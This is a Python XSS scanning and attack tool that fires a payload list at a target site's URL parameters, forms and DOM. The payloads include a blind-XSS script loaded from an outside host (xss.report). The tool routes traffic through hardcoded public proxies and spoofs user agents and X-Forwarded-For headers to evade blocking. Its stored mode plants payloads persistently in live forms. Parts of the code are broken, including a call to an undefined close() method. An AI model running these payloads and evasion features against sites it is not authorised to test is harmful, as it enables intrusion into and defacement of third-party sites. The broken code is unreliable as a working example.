#!/usr/bin/env python3
"""
XSS Cyber Champ Pro 2050 - Elite Edition
Now with dynamic proxy/payload loading and protocol-aware scanning
"""

import asyncio
import json
import random
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Optional

import httpx
from playwright.async_api import async_playwright
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import argparse

# ----------------------------- CONSTANTS -----------------------------
VERSION = "2050.2-Elite"
BANNER = f"""
[bold cyan]╔══════════════════════════════════════════════════╗
║    [blink]XSS CYBER CHAMP PRO {VERSION}[/blink]      ║
║  [italic]AI-Powered Next-Gen XSS Detection[/italic]  ║
║            [blink] Made by Dev kumar [/blink]        ║
╚══════════════════════════════════════════════════╝[/bold cyan]
"""

console = Console()

# ----------------------------- DEFAULT PAYLOADS -----------------------------
DEFAULT_PAYLOADS = [
    # Classic payloads
    '"><script>alert(document.domain)</script>',
    'javascript:alert(document.domain)',
    '"><svg/onload=alert(document.domain)>',
    
    # Obfuscated payloads
    '"><img src=x onerror=prompt(123)>',
    '"><img src=x onerror=alert(document.domain)>',
    'script\x20type="text/javascript">javascript:alert(1);</script>',
    '<script\x3Etype="text/javascript">javascript:alert(1);</script>',
    
    # Advanced evasion
    '"><iframe srcdoc="<script>alert(1)</script>">',
    '"><details/open/ontoggle=alert(1)>',
    '"><input autofocus onfocus=alert(1)>',
    
    # DOM-based
    '#<script>alert(1)</script>',
    '#javascript:alert(1)',
    '?test=</script><script>alert(1)</script>',
    
    # Blind XSS
    '"><script src=http://xss.report/yourid></script>'
]

# ----------------------------- DEFAULT PROXIES -----------------------------
DEFAULT_PROXIES = [
    "185.226.204.160:5713",
    "103.210.206.26:8080",
    "156.228.116.140:3128",
    "162.220.246.225:6509",
    "72.10.160.93:12649",
    "103.218.24.67:58080",
    "188.253.112.218:80",
    "156.228.115.84:3128",
    "108.170.12.11:80",
    "18.134.236.231:1080"
]

# ----------------------------- CLASSES -----------------------------
class ProxyEngine:
    """Advanced proxy management with protocol support"""
    def __init__(self):
        self.proxies: Dict[str, List[str]] = {
            'http': [],
            'socks4': [],
            'socks5': []
        }
    
    async def load_proxies(self, proxy_file: str, protocol: str = 'http'):
        """Load proxies from file with protocol detection"""
        try:
            with open(proxy_file) as f:
                proxies = [line.strip() for line in f if line.strip()]
            
            if protocol == 'auto':
                if 'socks5' in proxy_file.lower():
                    protocol = 'socks5'
                elif 'socks4' in proxy_file.lower():
                    protocol = 'socks4'
                else:
                    protocol = 'http'
            
            self.proxies[protocol] = proxies
            console.print(f"[green]✓ Loaded {len(proxies)} {protocol.upper()} proxies[/green]")
            return True
        except Exception as e:
            console.print(f"[red]✗ Failed to load proxies: {e}[/red]")
            return False
    
    def get_random_proxy(self, protocol: str = 'http') -> Optional[str]:
        """Get random proxy with specified protocol"""
        if not self.proxies[protocol]:
            return None
        
        proxy = random.choice(self.proxies[protocol])
        if protocol == 'http':
            return f"http://{proxy}"
        elif protocol == 'socks4':
            return f"socks4://{proxy}"
        elif protocol == 'socks5':
            return f"socks5://{proxy}"
        return None

class XSSScanner:
    def __init__(self):
        self.results = []
        self.injection_points = []
        self.payloads = DEFAULT_PAYLOADS
        self.proxy_engine = ProxyEngine()
        self.session = None
        self.browser = None
        self.context = None

    async def init(self, proxy_protocol: str = 'http'):
        """Initialize scanner components"""
        self.proxy_protocol = proxy_protocol
        await self._verify_proxies()
        self.session = httpx.AsyncClient(timeout=30)
        
        # Init headless browser with proxy if available
        browser_args = {
            "headless": True,
            "args": ["--disable-web-security", "--no-sandbox"]
        }
        
        proxy = self.proxy_engine.get_random_proxy(proxy_protocol)
        if proxy:
            browser_args["proxy"] = {"server": proxy}
        
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(**browser_args)
        self.context = await self.browser.new_context(
            ignore_https_errors=True,
            user_agent=self._get_random_user_agent()
        )

    def _get_random_user_agent(self) -> str:
        """Generate random modern user agent"""
        platforms = [
            "(Windows NT 10.0; Win64; x64)",
            "(Macintosh; Intel Mac OS X 14_2)",
            "(X11; Linux x86_64)",
            "(Android 13; Mobile)"
        ]
        webkit_versions = [
            "AppleWebKit/537.36 (KHTML, like Gecko)",
            "AppleWebKit/605.1.15 (KHTML, like Gecko)"
        ]
        browsers = [
            "Chrome/122.0.0.0 Safari/537.36",
            "Firefox/123.0",
            "Safari/17.0",
            "Edg/122.0.0.0"
        ]
        
        return f"Mozilla/5.0 {random.choice(platforms)} {random.choice(webkit_versions)} {random.choice(browsers)}"

    async def load_payloads(self, payload_file: str):
        """Load custom payloads from file"""
        try:
            with open(payload_file) as f:
                self.payloads = [line.strip() for line in f if line.strip()]
            console.print(f"[green]✓ Loaded {len(self.payloads)} custom payloads[/green]")
            return True
        except Exception as e:
            console.print(f"[red]✗ Failed to load payloads: {e}[/red]")
            return False

    async def _verify_proxies(self):
        """Verify and activate proxy list"""
        if not any(self.proxy_engine.proxies.values()):
            # Load default proxies if none provided
            self.proxy_engine.proxies['http'] = DEFAULT_PROXIES
            console.print("[yellow]⚠ Using default HTTP proxies[/yellow]")

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
            tasks = {}
            
            # Create progress tasks for each protocol
            for protocol, proxies in self.proxy_engine.proxies.items():
                if proxies:
                    tasks[protocol] = progress.add_task(
                        f"[cyan]Verifying {protocol.upper()} proxies...", 
                        total=len(proxies)
                    )

            # Verify proxies asynchronously
            async def check_proxy(proxy: str, protocol: str):
                try:
                    async with httpx.AsyncClient(
                        proxies={protocol: proxy},
                        timeout=10
                    ) as client:
                        response = await client.get("http://httpbin.org/ip")
                        if response.status_code == 200:
                            return True
                except:
                    return False
                return False

            # Run verification
            verified = {proto: [] for proto in self.proxy_engine.proxies}
            
            for protocol, proxies in self.proxy_engine.proxies.items():
                if not proxies:
                    continue
                    
                for proxy in proxies:
                    proxy_url = f"{protocol}://{proxy}"
                    if await check_proxy(proxy_url, protocol):
                        verified[protocol].append(proxy)
                    progress.update(tasks[protocol], advance=1)

            # Update verified proxies
            self.proxy_engine.proxies = verified
            
            # Print results
            for protocol, proxies in verified.items():
                if proxies:
                    console.print(f"[green]✓ {len(proxies)} {protocol.upper()} proxies verified[/green]")

    async def passive_scan(self, url: str):
        """Enhanced passive scan with parameter analysis"""
        console.print(f"[yellow]🔍 Starting passive scan for {url}[/yellow]")
        
        parsed = urlparse(url)
        injection_points = []
        
        # URL Parameter Analysis
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                injection_points.append({
                    'type': 'URL parameter',
                    'location': f'{parsed.path}?{param}=FUZZ',
                    'parameter': param,
                    'context': 'query'
                })
        
        # Fragment Analysis
        if parsed.fragment:
            injection_points.append({
                'type': 'URL fragment',
                'location': f'{parsed.path}#FUZZ',
                'parameter': 'fragment',
                'context': 'hash'
            })
        
        # Path Analysis
        path_parts = parsed.path.split('/')
        if len(path_parts) > 1:
            for i, part in enumerate(path_parts):
                if part and not part.startswith('.'):
                    injection_points.append({
                        'type': 'URL path',
                        'location': '/'.join(path_parts[:i+1] + ['FUZZ'] + path_parts[i+2:]),
                        'parameter': f'path_{i}',
                        'context': 'path'
                    })
        
        # Header Injection Points
        injection_points.extend([
            {
                'type': 'HTTP Header',
                'location': 'Header: User-Agent',
                'parameter': 'User-Agent',
                'context': 'header'
            },
            {
                'type': 'HTTP Header',
                'location': 'Header: Referer',
                'parameter': 'Referer',
                'context': 'header'
            }
        ])
        
        self.injection_points = injection_points
        
        if injection_points:
            table = Table(title="Discovered Injection Points", expand=True)
            table.add_column("Type", style="cyan")
            table.add_column("Location", style="magenta")
            table.add_column("Parameter", style="green")
            table.add_column("Context", style="yellow")
            
            for point in injection_points:
                table.add_row(
                    point['type'],
                    point['location'],
                    point['parameter'],
                    point['context']
                )
            
            console.print(table)
        else:
            console.print("[red]✗ No injection points found[/red]")
        
        return injection_points

    async def dom_monitor(self, url: str, timeout: int = 30):
        """Advanced DOM monitoring with behavior analysis"""
        console.print(f"[yellow]👁️ Starting DOM monitor for {url} (timeout: {timeout}s)[/yellow]")
        
        findings = []
        page = await self.context.new_page()
        
        # Setup advanced monitoring
        await page.expose_function("reportXSS", lambda msg: findings.append(msg))
        await page.add_init_script("""
            // Enhanced DOM monitoring
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.addedNodes) {
                        mutation.addedNodes.forEach((node) => {
                            if (node.innerHTML && node.innerHTML.includes('<script') && 
                                !node.innerHTML.includes('xss-monitor-ignore')) {
                                window.reportXSS(`DOM modification: ${node.innerHTML.substring(0, 100)}`);
                            }
                        });
                    }
                });
            });
            
            observer.observe(document, {
                childList: true,
                subtree: true,
                attributes: true,
                characterData: true
            });
            
            // Monitor all dangerous sinks
            const originalEval = window.eval;
            window.eval = function(code) {
                window.reportXSS(`eval() called: ${code.substring(0, 100)}`);
                return originalEval(code);
            };
            
            const originalSetTimeout = window.setTimeout;
            window.setTimeout = function(fn, delay) {
                if (typeof fn === 'string') {
                    window.reportXSS(`setTimeout with string: ${fn.substring(0, 100)}`);
                }
                return originalSetTimeout(fn, delay);
            };
            
            // Monitor dynamic script loading
            const originalCreateElement = document.createElement;
            document.createElement = function(tagName) {
                if (tagName.toLowerCase() === 'script') {
                    window.reportXSS('Dynamic script element created');
                }
                return originalCreateElement(tagName);
            };
            
            // Monitor location.hash changes
            let lastHash = location.hash;
            setInterval(() => {
                if (location.hash !== lastHash) {
                    window.reportXSS(`Hash changed to: ${location.hash}`);
                    lastHash = location.hash;
                }
            }, 100);
        """)
        
        try:
            await page.goto(url, wait_until="networkidle", timeout=timeout*1000)
            
            # Trigger potential DOM XSS vectors
            await page.evaluate("""() => {
                // Test common DOM XSS triggers
                location.hash = 'xss-monitor-test';
                document.write('<div xss-monitor-ignore>test</div>');
                setTimeout('console.log("xss-monitor-test")', 500);
                
                // Test Angular/React injection
                const div = document.createElement('div');
                div.innerHTML = '{{constructor.constructor("alert(1)")()}}';
                document.body.appendChild(div);
            }""")
            
            await asyncio.sleep(5)  # Wait for potential XSS
            
            # Check for alerts
            try:
                await page.wait_for_function("""() => {
                    return document.body.innerHTML.includes('<script') || 
                           document.body.innerHTML.includes('javascript:') ||
                           document.body.innerHTML.includes('{{') ||
                           document.body.innerHTML.includes('}}');
                }""", timeout=5000)
                findings.append("Potential DOM XSS detected through script injection or template")
            except:
                pass
            
            if findings:
                console.print("[bold red]DOM XSS Findings:[/bold red]")
                for finding in findings:
                    console.print(f"  • {finding}")
                self.results.extend(findings)
            else:
                console.print("[green]✓ No DOM XSS detected[/green]")
                
        except Exception as e:
            console.print(f"[red]DOM monitoring error: {e}[/red]")
        finally:
            await page.close()

    async def active_scan(self, url: str, mode: str = "reflected", post_data: Optional[str] = None):
        """Advanced active scanning with protocol-aware proxies"""
        console.print(f"[yellow]🚀 Starting active {mode} XSS scan for {url}[/yellow]")
        
        if mode == "reflected":
            await self._scan_reflected(url)
        elif mode == "stored":
            await self._scan_stored(url, post_data)
        elif mode == "dom":
            await self.dom_monitor(url)
        else:
            console.print(f"[red]Unknown scan mode: {mode}[/red]")

    async def _scan_reflected(self, url: str):
        """Enhanced reflected XSS scanning with proxy rotation"""
        semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
        
        async def test_payload(payload: str):
            async with semaphore:
                test_url = url.replace("FUZZ", payload)
                proxy = self.proxy_engine.get_random_proxy(self.proxy_protocol)
                
                try:
                    headers = {
                        "User-Agent": self._get_random_user_agent(),
                        "Accept": "text/html,application/xhtml+xml",
                        "X-Forwarded-For": f"203.0.113.{random.randint(1, 255)}"
                    }
                    
                    async with httpx.AsyncClient(
                        proxies={"all": proxy} if proxy else None,
                        timeout=20
                    ) as client:
                        # First request to get baseline
                        baseline = await client.get(
                            url.replace("FUZZ", "xss-test"),
                            headers=headers
                        )
                        
                        # Actual test request
                        response = await client.get(test_url, headers=headers)
                        
                        # Advanced detection
                        if payload in response.text:
                            result = f"Reflected XSS found: {test_url}"
                            self.results.append(result)
                            console.print(f"[bold red]🔥 {result}[/bold red]")
                        elif len(response.text) != len(baseline.text):
                            result = f"Potential reflected XSS (length variation): {test_url}"
                            self.results.append(result)
                            console.print(f"[bold yellow]⚠️ {result}[/bold yellow]")
                        elif response.status_code in [403, 429]:
                            console.print(f"[yellow]⚠️ Blocked on payload: {payload}[/yellow]")
                
                except Exception as e:
                    console.print(f"[red]Error testing {payload}: {e}[/red]")
                
                await asyncio.sleep(random.uniform(0.3, 1.2))  # Randomized delay
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(self.payloads))
            
            # Run all payload tests concurrently with throttling
            tasks = []
            for payload in self.payloads:
                tasks.append(test_payload(payload))
                progress.update(task, advance=1)
            
            await asyncio.gather(*tasks)

    async def _scan_stored(self, url: str, post_data: str):
        """Enhanced stored XSS scanning with form detection"""
        page = await self.context.new_page()
        
        try:
            # First visit to analyze forms
            await page.goto(url, wait_until="networkidle")
            
            # Auto-detect forms if no post_data provided
            if not post_data:
                forms = await page.query_selector_all("form")
                if forms:
                    console.print("[yellow]⚠ No POST data provided, attempting form auto-detection[/yellow]")
                    for form in forms:
                        form_action = await form.get_attribute("action") or url
                        form_method = await form.get_attribute("method") or "post"
                        
                        if form_method.lower() == "post":
                            inputs = await form.query_selector_all("input,textarea")
                            post_data = "&".join([
                                f"{await input.get_attribute('name') or 'field_' + str(i)}=FUZZ"
                                for i, input in enumerate(inputs)
                            ])
                            console.print(f"[blue]Detected form: {form_action} with fields: {post_data}[/blue]")
                            break
            
            if not post_data:
                console.print("[red]✗ No POST data provided and no forms detected[/red]")
                return
            
            for payload in self.payloads:
                try:
                    # Prepare payload data
                    data_pairs = post_data.replace("FUZZ", payload).split("&")
                    data = {}
                    for pair in data_pairs:
                        if "=" in pair:
                            key, value = pair.split("=", 1)
                            data[key] = value
                    
                    # Submit form
                    await page.goto(url, wait_until="networkidle")
                    
                    # Fill form fields
                    for field, value in data.items():
                        await page.fill(f'[name="{field}"]', value)
                    
                    # Submit form
                    await page.click("input[type=submit], button[type=submit]", timeout=5000)
                    await asyncio.sleep(2)  # Wait for submission
                    
                    # Check if payload persists
                    await page.goto(url, wait_until="networkidle")
                    content = await page.content()
                    
                    if payload in content:
                        result = f"Stored XSS found with payload: {payload}"
                        self.results.append(result)
                        console.print(f"[bold red]🔥 {result}[/bold red]")
                    
                    await asyncio.sleep(1)
                
                except Exception as e:
                    console.print(f"[red]Error testing stored XSS: {e}[/red]")
        
        finally:
            await page.close()

    def generate_report(self, format: str = "console", output_file: Optional[str] = None):
        """Enhanced reporting with vulnerability classification"""
        if not self.results and not self.injection_points:
            console.print("[yellow]No vulnerabilities or injection points found[/yellow]")
            return
        
        if format == "console":
            console.print("\n[bold cyan]📜 XSS Scan Report[/bold cyan]")
            console.print("[bold]="*60 + "[/bold]")
            
            if self.injection_points:
                console.print("\n[bold]Injection Points:[/bold]")
                for point in self.injection_points:
                    console.print(f"• [cyan]{point['type']}[/cyan] - [magenta]{point['location']}[/magenta]")
            
            if self.results:
                console.print("\n[bold]Vulnerabilities Found:[/bold]")
                for result in self.results:
                    console.print(f"• [red]{result}[/red]")
            
            console.print(f"\n[bold]Summary:[/bold]")
            console.print(f"  Injection Points: {len(self.injection_points)}")
            console.print(f"  Vulnerabilities: {len(self.results)}")
        
        elif format == "json":
            report = {
                "metadata": {
                    "scan_date": datetime.now().isoformat(),
                    "tool_version": VERSION,
                    "scan_duration": getattr(self, "scan_duration", 0)
                },
                "target": {
                    "url": getattr(self, "target_url", "unknown"),
                    "injection_points": self.injection_points
                },
                "results": [
                    {
                        "type": "xss",
                        "payload": extract_payload(result),
                        "location": extract_location(result),
                        "severity": "high"
                    } for result in self.results
                ],
                "stats": {
                    "total_payloads": len(self.payloads),
                    "tested_proxies": sum(len(p) for p in self.proxy_engine.proxies.values())
                }
            }
            
            if output_file:
                with open(output_file, "w") as f:
                    json.dump(report, f, indent=2)
                console.print(f"[green]✓ JSON report saved to {output_file}[/green]")
            else:
                console.print_json(data=report)
        
        elif format == "html":
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>XSS Scan Report - {datetime.now().strftime('%Y-%m-%d')}</title>
                <style>
                    body {{ font-family: 'Courier New', monospace; margin: 2em; }}
                    h1, h2 {{ color: #4a4a4a; }}
                    .finding {{ 
                        background: #fff0f0; 
                        padding: 1em; 
                        margin: 1em 0; 
                        border-left: 4px solid red;
                        border-radius: 4px;
                    }}
                    .injection-point {{
                        background: #f0f0ff;
                        padding: 1em;
                        margin: 1em 0;
                        border-left: 4px solid blue;
                        border-radius: 4px;
                    }}
                    .summary {{
                        background: #f8f8f8;
                        padding: 1em;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                    }}
                </style>
            </head>
            <body>
                <h1>XSS Scan Report</h1>
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                
                <div class="summary">
                    <h2>Scan Summary</h2>
                    <p><strong>Target:</strong> {getattr(self, 'target_url', 'unknown')}</p>
                    <p><strong>Injection Points Found:</strong> {len(self.injection_points)}</p>
                    <p><strong>Vulnerabilities Found:</strong> {len(self.results)}</p>
                </div>
                
                <h2>Injection Points</h2>
                {"".join(
                    f'<div class="injection-point"><strong>{point["type"]}</strong>: {point["location"]}</div>'
                    for point in self.injection_points
                )}
                
                <h2>Findings</h2>
                {"".join(
                    f'<div class="finding">{finding}</div>'
                    for finding in self.results
                )}
            </body>
            </html>
            """
            
            if output_file:
                with open(output_file, "w") as f:
                    f.write(html_content)
                console.print(f"[green]✓ HTML report saved to {output_file}[/green]")
            else:
                console.print(html_content)

# Helper functions
def extract_payload(result: str) -> str:
    """Extract payload from result string"""
    if "payload:" in result:
        return result.split("payload:")[1].strip()
    return result.split("found:")[-1].strip()

def extract_location(result: str) -> str:
    """Extract location from result string"""
    if "at:" in result:
        return result.split("at:")[1].strip()
    return "unknown"

# ----------------------------- MAIN -----------------------------
async def main():
    console.print(BANNER)
    
    parser = argparse.ArgumentParser(description="XSS Cyber Champ Pro 2050 - Elite Edition")
    parser.add_argument("url", help="Target URL (use FUZZ for injection point)")
    parser.add_argument("--mode", choices=["passive", "active", "dom"], default="active", 
                      help="Scan mode (default: active)")
    parser.add_argument("--type", choices=["reflected", "stored", "all"], default="reflected",
                      help="XSS type to scan for (default: reflected)")
    parser.add_argument("--post", help="POST data for stored XSS (use FUZZ)")
    parser.add_argument("--payloads", help="File containing custom XSS payloads")
    parser.add_argument("--proxy", help="Proxy file (e.g., socks5.txt, http.txt)")
    parser.add_argument("--protocol", choices=["http", "socks4", "socks5", "auto"], default="auto",
                      help="Proxy protocol (default: auto-detect from filename)")
    parser.add_argument("--output", help="Output file for report")
    parser.add_argument("--format", choices=["console", "json", "html"], default="console",
                      help="Report format (default: console)")
    args = parser.parse_args()
    
    scanner = XSSScanner()
    
    # Load custom payloads if specified
    if args.payloads:
        await scanner.load_payloads(args.payloads)
    
    # Load proxies if specified
    if args.proxy:
        await scanner.proxy_engine.load_proxies(args.proxy, args.protocol)
    
    await scanner.init(args.protocol if args.proxy else 'http')
    
    try:
        start_time = time.time()
        
        if args.mode == "passive":
            await scanner.passive_scan(args.url)
        elif args.mode == "dom":
            await scanner.dom_monitor(args.url)
        else:
            if args.type in ["reflected", "all"]:
                await scanner.active_scan(args.url, "reflected")
            if args.type in ["stored", "all"] and args.post:
                await scanner.active_scan(args.url, "stored", args.post)
        
        scanner.scan_duration = time.time() - start_time
        scanner.generate_report(args.format, args.output)
    
    except Exception as e:
        console.print(f"[red]Critical error: {e}[/red]", style="bold")
    finally:
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())
